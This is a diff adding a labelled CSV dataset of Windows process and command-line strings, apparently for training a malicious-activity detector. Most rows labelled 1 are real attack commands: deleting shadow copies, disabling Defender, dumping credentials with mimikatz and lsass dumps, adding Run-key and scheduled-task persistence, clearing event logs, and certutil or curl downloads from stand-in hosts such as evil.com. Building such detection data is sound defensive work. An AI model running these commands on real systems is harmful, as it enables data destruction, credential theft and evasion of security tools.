@@ -1,0 +1,114 @@
+log_text,label
+"notepad.exe",0
+"calculator.exe",0
+"calc.exe",0
+"chrome.exe",0
+"firefox.exe",0
+"msedge.exe",0
+"winword.exe splwow64.exe",0
+"excel.exe",0
+"powerpnt.exe",0
+"outlook.exe",0
+"explorer.exe",0
+"mspaint.exe",0
+"taskmgr.exe",0
+"code.exe git.exe",0
+"python.exe app.py",0
+"node.exe npm.exe",0
+"vlc.exe",0
+"spotify.exe",0
+"7z.exe",0
+"winrar.exe",0
+"cleanmgr.exe",0
+"snippingtool.exe",0
+"write.exe wordpad.exe",0
+"charmap.exe",0
+"magnify.exe",0
+"svchost.exe dwm.exe",0
+"services.exe svchost.exe spoolsv.exe",0
+"ctfmon.exe sihost.exe",0
+"RuntimeBroker.exe SearchHost.exe",0
+"StartMenuExperienceHost.exe",0
+"cmd.exe dir",0
+"cmd.exe /c echo Hello World",0
+"powershell.exe Get-Process",0
+"powershell.exe Get-Date",0
+"powershell.exe Get-ChildItem",0
+"devenv.exe msbuild.exe",0
+"wt.exe powershell.exe",0
+"conhost.exe cmd.exe",0
+"control.exe",0
+"mmc.exe devmgmt.msc",0
+"resmon.exe",0
+"perfmon.exe",0
+"dxdiag.exe",0
+"mstsc.exe",0
+"AcroRd32.exe",0
+"FoxitReader.exe",0
+"slack.exe",0
+"discord.exe",0
+"steam.exe",0
+"cmd.exe type readme.txt",0
+"cmd.exe powershell.exe vssadmin.exe",1
+"cmd.exe vssadmin.exe delete shadows /all /quiet",1
+"vssadmin.exe delete shadows",1
+"vssadmin delete shadows",1
+"svchost.exe regedit.exe taskkill.exe",1
+"wmic.exe powershell.exe net.exe",1
+"certutil.exe bitsadmin.exe",1
+"certutil.exe -urlcache -split -f",1
+"certutil -urlcache",1
+"bitsadmin.exe /transfer",1
+"powershell.exe Invoke-WebRequest",1
+"powershell Invoke-WebRequest",1
+"powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest",1
+"powershell.exe -nop -w hidden -enc",1
+"powershell.exe -enc",1
+"powershell.exe DownloadString",1
+"powershell.exe DownloadFile",1
+"powershell.exe IEX",1
+"taskkill.exe /f /im msmpeng.exe",1
+"taskkill.exe /f /im sqlservr.exe",1
+"net.exe stop windefend",1
+"net stop windefend",1
+"reg.exe add HKLM\\Software\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",1
+"reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater",1
+"reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor",1
+"schtasks.exe /create /sc onlogon /tn Payload",1
+"schtasks.exe /create /tn MaliciousTask",1
+"sc.exe create RemoteService binpath=",1
+"bcdedit.exe /set recoveryenabled no",1
+"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",1
+"wbadmin.exe delete catalog -quiet",1
+"wevtutil.exe cl Security",1
+"wevtutil.exe cl System",1
+"mimikatz.exe sekurlsa::logonpasswords",1
+"reg.exe save hklm\\sam sam.save",1
+"rundll32.exe comsvcs.dll MiniDump",1
+"procdump.exe -ma lsass.exe",1
+"mshta.exe vbscript:Close(Execute(CreateObject))",1
+"mshta.exe javascript:",1
+"regsvr32.exe /s /u /i:http:// scrobj.dll",1
+"regsvr32.exe /s /i:",1
+"rundll32.exe shell32.dll",0
+"wmic.exe process call create",1
+"wmic.exe shadowcopy delete",1
+"cmd.exe /c whoami.exe",1
+"cmd.exe /c net.exe user",1
+"net.exe localgroup administrators /add",1
+"net.exe user backdoor Password123! /add",1
+"curl.exe -O http://malicious.ru/payload.exe",1
+"cscript.exe payload.vbs",1
+"wscript.exe malware.js",1
+"powershell.exe Start-Process cmd.exe -WindowStyle Hidden",1
+"cipher.exe /w:C",1
+"ransomware.exe vssadmin.exe taskkill.exe",1
+"dropper.exe certutil.exe cmd.exe powershell.exe",1
+"stealer.exe reg.exe cmd.exe curl.exe",1
+"backdoor.exe nc.exe cmd.exe",1
+"keylogger.exe rundll32.exe",1
+"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",1
+"powershell.exe Add-MpPreference -ExclusionPath C:\\",1
+"wmic.exe /node:localhost process call create cmd.exe",1
+"cmd.exe /c certutil.exe -urlcache -split -f http://evil.com/b.exe b.exe & b.exe",1
+"powershell.exe -ExecutionPolicy Unrestricted -File inject.ps1",1
